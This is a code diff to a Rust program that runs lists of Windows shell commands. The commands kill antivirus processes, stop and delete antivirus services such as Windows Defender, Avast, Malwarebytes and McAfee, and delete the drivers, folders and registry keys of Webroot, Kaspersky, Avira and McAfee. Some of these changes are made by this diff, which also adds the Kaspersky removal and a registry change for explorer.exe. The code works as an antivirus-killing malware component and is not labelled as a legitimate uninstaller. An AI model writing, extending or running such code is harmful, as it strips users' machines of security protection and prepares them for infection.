@@ -119,14 +119,18 @@ fn main() -> io::Result<()> {
 
         // Group 3: Webroot services and files cleanup
         let webroot_cmds = vec![
-            "sc delete WRSkyClient",
-            "sc delete WRCoreService",
-            "sc delete WRSVC",
+            // Services to stop
             "sc stop WRSkyClient",
             "sc stop WRCoreService",
             "sc stop WRSVC",
+            // Services to delete
+            "sc delete WRSkyClient",
+            "sc delete WRCoreService",
+            "sc delete WRSVC",
+            // Files to delete
             "del /f /y \"%SystemRoot%\\System32\\Drivers\\wrkrn.sys\"",
             "del /f /y \"%SystemRoot%\\System32\\wruser.dll\"",
+            // Folders to delete
             "rd /s /q \"%ProgramFiles%\\Webroot\"",
             "rd /s /q \"%ProgramFiles(x86)%\\Webroot\"",
             "rd /s /q \"%ProgramData%\\WRCore\"",
@@ -138,23 +142,32 @@ fn main() -> io::Result<()> {
         ];
         commands.extend(webroot_cmds);
 
-        // Group 4: Avira files cleanup
-        let avira_cmds = vec![
+        // Group 4: Kaspersky directories cleanup 
+        let kaspersky_dirs_cmds = vec![ 
+            "rd /s /q \"%ProgramData%\\Kaspersky Lab\"", 
+            "rd /s /q \"%ProgramFiles%\\Kaspersky Lab\"", 
+            "rd /s /q \"%ProgramFiles(x86)%\\Kaspersky Lab\"", 
+        ];
+
+        commands.extend(kaspersky_dirs_cmds);
+
+        // Group 5: Avira directories cleanup
+        let avira_dirs_cmds = vec![
             "rd /s /q \"%ProgramFiles%\\Avira\"",
             "rd /s /q \"%ProgramFiles(x86)%\\Avira\"",
             "rd /s /q \"%ProgramData%\\Avira\"",
         ];
-        commands.extend(avira_cmds);
+        commands.extend(avira_dirs_cmds);
 
-        // Group 5: McAfee files cleanup
-        let mcafee_files_cmds = vec![
+        // Group 6: McAfee directories cleanup
+        let mcafee_dirs_cmds = vec![
             "rd /s /q \"%ProgramData%\\McAfee\"",
             "rd /s /q \"%ProgramFiles%\\McAfee\"",
             "rd /s /q \"%ProgramFiles(x86)%\\McAfee\"",
         ];
-        commands.extend(mcafee_files_cmds);
+        commands.extend(mcafee_dirs_cmds);
 
-        // Group 6: Kill antivirus processes
+        // Group 7: Kill antivirus processes
         let kill_processes_cmds = vec![
             "taskkill /F /IM AvastSvc.exe /T",
             "taskkill /F /IM AvastUI.exe /T",
@@ -166,35 +179,43 @@ fn main() -> io::Result<()> {
         ];
         commands.extend(kill_processes_cmds);
 
-        // Group 7: Stop antivirus services
+        // Group 8: Stop antivirus services
         let stop_services_cmds = vec![
+            // Avast
             "sc stop \"AvastSvc\"",
             "sc stop \"AvastWscReporter\"",
             "sc stop \"aswVmm\"",
+            // Malwarebytes
             "sc stop \"MBAMService\"",
+            // Windows Defender
             "sc stop \"WinDefend\"",
             "sc stop \"VSSERV\"",
+            //  McAfee
             "sc stop \"McAfee Service Controller\"",
             "sc stop \"McAfee Firewall Core Service\"",
             "sc stop \"McAfee Validation Trust Protection\"",
         ];
         commands.extend(stop_services_cmds);
 
-        // Group 8: Delete antivirus services
+        // Group 9: Delete antivirus services
         let delete_services_cmds = vec![
+            // Avast
             "sc delete \"AvastSvc\"",
             "sc delete \"AvastWscReporter\"",
             "sc delete \"aswVmm\"",
+            // Malwarebytes
             "sc delete \"MBAMService\"",
+            // Windows Defender
             "sc delete \"WinDefend\"",
             "sc delete \"VSSERV\"",
+            //  McAfee
             "sc delete \"McAfee Service Controller\"",
             "sc delete \"McAfee Firewall Core Service\"",
             "sc delete \"McAfee Validation Trust Protection\"",
         ];
         commands.extend(delete_services_cmds);
 
-        // Group 9: Delete registry keys for antivirus programs
+        // Group 10: Delete registry keys for antivirus programs
         let delete_registry_cmds = vec![
             // Startup keys
             "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /f",
@@ -264,12 +285,12 @@ fn main() -> io::Result<()> {
             execute_command(command);
         }
         
-        // Group 10: Remove antivirus folder
+        // Remove antivirus folder
         if let Err(e) = remove_antivirus_folder() {
             eprintln!("Error removing antivirus folder: {}", e);
         }
         
-        // Group 11: Modify registry for explorer.exe
+        // Modify registry for explorer.exe
         if let Err(e) = modify_registry() {
             eprintln!("Error removing antivirus folder: {}", e);
         }
